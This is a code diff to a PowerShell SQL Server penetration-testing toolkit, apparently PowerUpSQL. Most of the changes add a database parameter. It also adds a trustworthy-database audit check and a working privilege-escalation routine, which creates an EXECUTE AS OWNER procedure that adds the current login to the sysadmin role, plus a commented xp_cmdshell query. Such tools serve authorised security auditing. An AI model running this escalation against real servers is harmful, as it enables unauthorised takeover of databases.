@@ -29,7 +29,9 @@ Function  Get-SQLConnectionObject {
     .PARAMETER Password
         SQL Server or domain account password to authenticate with. 
     .PARAMETER Credential
-        SQL Server credential. 
+        SQL Server credential.
+    .PARAMETER Database
+        Default database to connect to.          
     .EXAMPLE
         PS C:\> Get-SQLConnectionObject -Username MySQLUser -Password MySQLPassword
 
@@ -69,14 +71,13 @@ Function  Get-SQLConnectionObject {
         HelpMessage="SQL Server instance to connection to.")]
         [string]$Instance,
 
-        [Parameter(Mandatory=$false,        
-        ValueFromPipelineByPropertyName=$true,
-        HelpMessage="Set default db.")]
-        [string]$Database,
-
         [Parameter(Mandatory=$false,
         HelpMessage="Dedicated Administrator Connection (DAC).")]
         [Switch]$DAC,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Default database to connect to.")]
+        [String]$Database,
 
         [Parameter(Mandatory=$false,
         HelpMessage="Connection timeout.")]
@@ -156,6 +157,8 @@ Function  Get-SQLConnectionTest {
         SQL Server instance to connection to. 
     .PARAMETER DAC
         Connect using Dedicated Admin Connection. 
+    .PARAMETER Database
+        Default database to connect to. 
     .PARAMETER TimeOut
         Connection time out. 
     .PARAMETER SuppressVerbose
@@ -193,6 +196,10 @@ Function  Get-SQLConnectionTest {
         [Switch]$DAC,
 
         [Parameter(Mandatory=$false,
+        HelpMessage="Default database to connect to.")]
+        [String]$Database,
+
+        [Parameter(Mandatory=$false,
         HelpMessage="Connection timeout.")]
         [string]$TimeOut,
 
@@ -224,10 +231,10 @@ Function  Get-SQLConnectionTest {
         if($DAC){
 
             # Create connection object
-            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
         }else{
             # Create connection object
-            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
         }
 
         # Attempt connection
@@ -287,6 +294,8 @@ Function  Get-SQLConnectionTestThreaded {
         SQL Server instance to connection to. 
     .PARAMETER DAC
         Connect using Dedicated Admin Connection. 
+    .PARAMETER Database
+        Default database to connect to. 
     .PARAMETER TimeOut
         Connection time out. 
     .PARAMETER SuppressVerbose
@@ -324,6 +333,10 @@ Function  Get-SQLConnectionTestThreaded {
         [Parameter(Mandatory=$false,
         HelpMessage="Connect using Dedicated Admin Connection.")]
         [Switch]$DAC,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Default database to connect to.")]
+        [String]$Database,
 
         [Parameter(Mandatory=$false,
         HelpMessage="Connection timeout.")]
@@ -375,10 +388,10 @@ Function  Get-SQLConnectionTestThreaded {
             if($DAC){
 
                 # Create connection object
-                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
             }else{
                 # Create connection object
-                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
             }
 
             # Attempt connection
@@ -439,6 +452,8 @@ Function  Get-SQLQuery {
         SQL Server instance to connection to. 
     .PARAMETER DAC
         Connect using Dedicated Admin Connection. 
+    .PARAMETER Database
+        Default database to connect to. 
     .PARAMETER TimeOut
         Connection time out. 
     .PARAMETER SuppressVerbose
@@ -486,6 +501,10 @@ Function  Get-SQLQuery {
         [Switch]$DAC,
 
         [Parameter(Mandatory=$false,
+        HelpMessage="Default database to connect to.")]
+        [String]$Database,
+
+        [Parameter(Mandatory=$false,
         HelpMessage="Connection timeout.")]
         [int]$TimeOut,
 
@@ -510,10 +529,10 @@ Function  Get-SQLQuery {
         if($DAC){
 
             # Create connection object
-            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC 
+            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database
         }else{
             # Create connection object
-            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
         }
 
         # Parse SQL Server instance name
@@ -596,6 +615,8 @@ Function  Get-SQLQueryThreaded {
         SQL Server instance to connection to. 
     .PARAMETER DAC
         Connect using Dedicated Admin Connection. 
+    .PARAMETER Database
+        Default database to connect to. 
     .PARAMETER TimeOut
         Connection time out. 
     .PARAMETER SuppressVerbose
@@ -635,6 +656,10 @@ Function  Get-SQLQueryThreaded {
         [Parameter(Mandatory=$false,
         HelpMessage="Connect using Dedicated Admin Connection.")]
         [Switch]$DAC,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Default database to connect to.")]
+        [String]$Database,
 
         [Parameter(Mandatory=$true,
         HelpMessage="Query to be executed.")]
@@ -687,10 +712,10 @@ Function  Get-SQLQueryThreaded {
             if($DAC){
 
                 # Create connection object
-                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
             }else{
                 # Create connection object
-                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
             }
 
             # Attempt connection
@@ -7724,6 +7749,159 @@ Function Invoke-SQLEscalate-ServerLink {
 
 
 # ---------------------------------------
+# Invoke-SQLEscalate-TrustedDatabase
+# ---------------------------------------
+# Author: Scott Sutherland
+Function Invoke-SQLEscalate-TrustedDatabase{
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server or domain account to authenticate with.")]
+        [string]$Username,
+
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server or domain account password to authenticate with.")]
+        [string]$Password,
+
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="Windows credentials.")]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+        
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server instance to connection to.")]
+        [string]$Instance,       
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Don't output anything.")]
+        [string]$NoOutput,
+        
+        [Parameter(Mandatory=$false,
+        HelpMessage="Exploit vulnerable issues.")]
+        [switch]$Exploit
+    )
+
+    Begin
+    {                 
+        # Table for output
+        $TblData = New-Object System.Data.DataTable 
+        $TblData.Columns.Add("ComputerName") | Out-Null
+        $TblData.Columns.Add("Instance") | Out-Null
+        $TblData.Columns.Add("Vulnerability") | Out-Null
+        $TblData.Columns.Add("Description") | Out-Null
+        $TblData.Columns.Add("Remediation") | Out-Null
+        $TblData.Columns.Add("Severity") | Out-Null
+        $TblData.Columns.Add("IsVulnerable") | Out-Null
+        $TblData.Columns.Add("IsExploitable") | Out-Null
+        $TblData.Columns.Add("Exploited") | Out-Null
+        $TblData.Columns.Add("ExploitCmd") | Out-Null
+        $TblData.Columns.Add("Details") | Out-Null    
+        $TblData.Columns.Add("Reference") | Out-Null   
+        $TblData.Columns.Add("Author") | Out-Null   
+    }
+
+    Process
+    {   
+        # Status User
+        Write-Verbose "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database" 
+
+        # Test connection to server
+        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
+        if(-not $TestConnection){   
+            
+            # Status user
+            Write-Verbose "$Instance : CONNECTION FAILED."
+            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."           
+            Return
+        }else{
+            Write-Verbose "$Instance : CONNECTION SUCCESS."
+        }
+
+        # Grab server information
+        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        $CurrentLogin = $ServerInfo.CurrentLogin
+        $ComputerName = $ServerInfo.ComputerName
+
+        # --------------------------------------------     
+        # Set function meta data for report output
+        # --------------------------------------------  
+        if($Exploit){
+            $TestMode  = "Exploit"
+        }else{
+            $TestMode  = "Audit"
+        }         
+        $Vulnerability = "Excessive Privilege - Trusted Database"
+        $Description   = "One or more database is configured as trustworthy.  Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server."
+        $Remediation   = "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it."
+        $Severity      = "Low" 
+        $IsVulnerable  = "No"
+        $IsExploitable = "No" 
+        $Exploited     = "No"
+        $ExploitCmd    = "There is not exploit available at this time."
+        $Details       = ""   
+        $Reference     = "https://msdn.microsoft.com/en-us/library/ms187861.aspx"       
+        $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016" 
+        
+        # -----------------------------------------------------------------     
+        # Check for the Vulnerability
+        # Note: Typically a missing patch or weak configuration
+        # -----------------------------------------------------------------     
+
+        # Select links configured with static credentials
+        $TrustedDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.DatabaseName -ne 'msdb' -and $_.is_trustworthy_on -eq "True"}
+
+        # Update vulnerable status
+        if($TrustedDatabases){
+
+            $IsVulnerable  = "Yes"             
+            $TrustedDatabases | 
+            ForEach-Object{                
+                $DatabaseName = $TrustedDatabases.DatabaseName                
+        
+                Write-Verbose "$Instance : - The database $DatabaseName was found configured as trustworthy."
+                $Details = "The database $DatabaseName was found configured as trustworthy."
+                $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                                       
+            }
+        }else{
+            Write-Verbose "$Instance : - No non-default trusted databases were found."
+        }
+
+        # -----------------------------------------------------------------     
+        # Check for exploit dependancies 
+        # Note: Typically secondary configs required for dba/os execution
+        # -----------------------------------------------------------------
+        # $IsExploitable = "No" or $IsExploitable = "Yes"
+        # Check if the link is alive and verify connection + check if sysadmin
+
+
+        # -----------------------------------------------------------------    
+        # Exploit Vulnerability
+        # Note: Add the current user to sysadmin fixed server role
+        # -----------------------------------------------------------------        
+        # $Exploited = "No" or $Exploited     = "Yes" 
+        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
+        # Also, recommend link crawler module
+                       
+                   
+        # Status User
+        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database" 
+    }
+
+    End
+    {   
+        # Return data  
+        if ( -not $NoOutput){            
+            Return $TblData       
+        }
+    }
+}
+
+
+# ---------------------------------------
 # Invoke-SQLEscalate-CreateProcedure
 # ---------------------------------------
 # Author: Scott Sutherland
@@ -8101,9 +8279,22 @@ Function Invoke-SQLEscalate-DbOwnerRole {
                                 # Status user
                                 Write-Verbose "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                 Write-Verbose "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."                            
+
+                                $SpQuery = "CREATE PROCEDURE sp_elevate_me
+                                            WITH EXECUTE AS OWNER
+                                            AS
+                                            begin
+                                            EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'
+                                            end;"
                                                         
-                                # Attempt to add the current login to sysadmins fixed server role
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose | Out-Null                                              
+                                # Add sp_elevate_me stored procedure
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "$SpQuery" -SuppressVerbose -Database $DatabaseTarget | Out-Null                                              
+
+                                # Run sp_elevate_me stored procedure
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "sp_elevate_me" -SuppressVerbose -Database $DatabaseTarget | Out-Null                                              
+
+                                # Remove sp_elevate_me stored procedure
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "DROP PROC sp_elevate_me" -SuppressVerbose -Database $DatabaseTarget | Out-Null                                              
 
                                  # Verify the login was added successfully
                                 $SysadminPostCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object Status -ExpandProperty Status               
@@ -8248,13 +8439,9 @@ Function Invoke-SQLEscalate-DbDdlAdmin {
         $IsVulnerable  = "No"
         $IsExploitable = "No" 
         $Exploited     = "No"
-        if($Username){
-            $ExploitCmd    = "Invoke-SQLEscalate-DbDdlAdmin -Instance $Instance -Username $Username -Password $Password -Exploit"
-        }else{
-            $ExploitCmd    = "Invoke-SQLEscalate-DbDdlAdmin -Instance $Instance -Exploit"
-        }
+        $ExploitCmd    = "No exploit command is available at this time, but a custom assesmbly could be used."
         $Details       = ""   
-        $Dependancies = "Affected databases must be owned by a sysadmin and be trusted. Or it must be possible to load a custom assembly configured for external access."
+        $Dependancies  = "Affected databases must be owned by a sysadmin and be trusted. Or it must be possible to load a custom assembly configured for external access."
         $Reference     = "https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx"       
         $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016" 
         
@@ -8267,7 +8454,7 @@ Function Invoke-SQLEscalate-DbDdlAdmin {
         $CurrentPrincpalList|
         ForEach-Object {
             
-            # Check if login or role has the DB_OWNER roles in any databases
+            # Check if login or role has the DB_DDLADMIN roles in any databases
             $DBDDLADMIN = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_DDLADMIN -PrincipalName $_ -SuppressVerbose
 
             # -----------------------------------------------------------------     
@@ -8278,7 +8465,7 @@ Function Invoke-SQLEscalate-DbDdlAdmin {
             # Check for db ownerships  
             if($DBDDLADMIN){
 
-                # Add an entry for each database where the user has the db_owner role
+                # Add an entry for each database where the user has the DB_DDLADMIN role
                 $DBDDLADMIN|
                 ForEach-Object{
                     $DatabaseTarget = $_.DatabaseName
@@ -8291,7 +8478,7 @@ Function Invoke-SQLEscalate-DbDdlAdmin {
                     $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object {$_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1 } 
 
                     if($Depends){
-                        $IsExploitable = "Yes"
+                        $IsExploitable = "No"
                         Write-Verbose "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
                         
                         # -----------------------------------------------------------------    
